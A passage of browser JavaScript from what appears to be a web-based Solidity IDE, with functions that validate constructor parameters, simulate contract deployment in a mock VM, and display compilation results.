        } else if (error.message
            && error.message.includes('gas')) {
            throw new Error(
                'Transaction failed: insufficient gas or gas'
                + ' limit too low'
            );
        } else {
            throw error;
        }
    }
}

async function deployToRemixVM(constructorParams) {
    const mockAddress =
        (typeof window !== 'undefined' && window.FIXED_CONTRACT_ADDRESS)
        || ('0x' + Math.random().toString(16).substr(2, 40));
    const mockTxHash = '0x' + Math.random().toString(16).substr(2, 64);
    const contractName = document.getElementById('contract-select').value;

    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));

    const mockGasUsed = Math.floor(250000 + Math.random() * 400000);

    const mockContract = {
        options: { address: mockAddress },
        transactionHash: mockTxHash,
        gasUsed: mockGasUsed,
        methods: {}
    };

    currentContractABI.forEach(item => {
        if (item.type === 'function') {
            mockContract.methods[item.name] = (...args) => ({
                call: () => {
                    if (item.stateMutability === 'view' || item.stateMutability === 'pure') {
                        return Promise.resolve('Mock result from ' + item.name);
                    }
                    return Promise.resolve();
                },
                send: () => {
                    return Promise.resolve({
                        transactionHash: '0x' + Math.random().toString(16).substr(2, 64),
                        gasUsed: Math.floor(21000 + Math.random() * 80000)
                    });
                }
            });
        }
    });

    addDeployedContract(contractName, mockAddress, mockContract);

    logToTerminal(`✅ Contract deployed successfully in VM!`, 'success');
    logToTerminal(`📄 Contract: <code>${mockAddress}</code>`, 'info');
    logToTerminal(`🔗 Transaction Hash: <code>${mockTxHash}</code>`, 'info');
    logToTerminal(`📊 Gas used: ${mockGasUsed.toLocaleString()} (simulated)`, 'info');
}

async function deployContract() {
    if (!compiledContract || (!userAccount && document.getElementById('environment-select').value !== 'vm')) {
        logToTerminal('❌ Missing contract or account for deployment', 'error');
        return;
    }

    const environment = document.getElementById('environment-select').value;
    const contractName = document.getElementById('contract-select').value;

    if (!contractName) {
        logToTerminal('❌ No contract selected for deployment', 'error');
        return;
    }

    try {
        logToTerminal('🚀 Starting deployment...', 'info');

        const constructorParams = [];
        const constructor = currentContractABI?.find(item => item.type === 'constructor');

        if (constructor && constructor.inputs && constructor.inputs.length > 0) {
            constructor.inputs.forEach((input, index) => {
                const inputElement = document.getElementById(`constructor-param-${index}`);
                let value = inputElement.value.trim();

                if (input.type.includes('uint') || input.type.includes('int')) {
                    value = value || '0';
                    if (!/^\d+$/.test(value)) {
                        throw new Error(`Invalid ${input.type} value: ${value}`);
                    }
                } else if (input.type === 'bool') {
                    value = value.toLowerCase() === 'true';
                } else if (input.type === 'address') {
                    if (value && !isAddressSafe(value)) {
                        throw new Error(`Invalid address: ${value}`);
                    }
                }

                constructorParams.push(value);
            });

            logToTerminal(`📋 Constructor parameters: [${constructorParams.join(', ')}]`, 'info');
        }

        if (environment === 'injected') {
            await deployToMetaMask(constructorParams);
        } else {
            await deployToRemixVM(constructorParams);
        }

        showPluginSuccess('udapp');

    } catch (error) {
        logToTerminal(`❌ Deployment failed: ${error.message}`, 'error');
        console.error('Deployment error:', error);
    }
}

function showCompilationSuccess(result, contractName) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-success';

    let successMessage = `<div><strong>✓ Compilation successful</strong></div>`;

    if (result.metadata) {
        successMessage += `<div style="margin-top: 6px; font-size: 10px; color: #888;">`;
        successMessage += `${result.bytecode.length} bytes | ${result.abi ? result.abi.length : 0} functions`;
        successMessage += ` | Gas Optimized`;
        successMessage += `</div>`;
    }

    resultElement.innerHTML = successMessage;
}

function showCompilationError(result) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-error';

    let errorText = result.error || 'Unknown error';

    if (result.details && Array.isArray(result.details)) {
        const formattedErrors = result.details.map(err => {
            const message = err.formattedMessage || err.message || 'Unknown error';
            return message.replace(/^\s*--> .*$/gm, '').trim();
        }).join('\n\n');

        if (formattedErrors) {
            errorText = formattedErrors;
        }
    }

    resultElement.innerHTML = `
        <div><strong>✗ Compilation failed</strong></div>
        <pre style="margin-top: 8px; font-size: 10px; max-height: 150px; overflow-y: auto;">${errorText}</pre>
    `;
}

function updateContractSelect(contractName) {
    const contractSelect = document.getElementById('contract-select');

    const placeholder = contractSelect.querySelector('option[value=""]');
    contractSelect.innerHTML = '';
    if (placeholder) {
        contractSelect.appendChild(placeholder);
    }

    const option = document.createElement('option');
    option.value = contractName;
    option.textContent = contractName;
    contractSelect.appendChild(option);

    contractSelect.value = contractName;
    updateConstructorParams();
}

function clearCompilationResults() {
    const compilationResult = document.getElementById('compilation-result');
    compilationResult.className = 'compilation-output';
    compilationResult.innerHTML = '<div class="output-placeholder">Select a Solidity file to compile</div>';

    const contractSelect = document.getElementById('contract-select');
    contractSelect.innerHTML = '<option value="">No compiled contracts</option>';

    compiledContract = null;
    currentContractABI = null;

    window.compiledContract = null;
    window.currentContractABI = null;

    // Remove the green checkmark from the Solidity plugin icon
    const successBadge = document.querySelector('[data-plugin="solidity"] .plugin-success');
    if (successBadge) successBadge.remove();

    updateDeployButton();

    if (window.clearEditorErrors) {
        clearEditorErrors();
    }
}

function clearContractTemplateCache() {
    cachedContractTemplate = null;
    lastTemplateCheck = 0;
    logToTerminal(`🗑️ Contract template cache cleared`, 'info');
}

window.clearContractTemplateCache = clearContractTemplateCache;
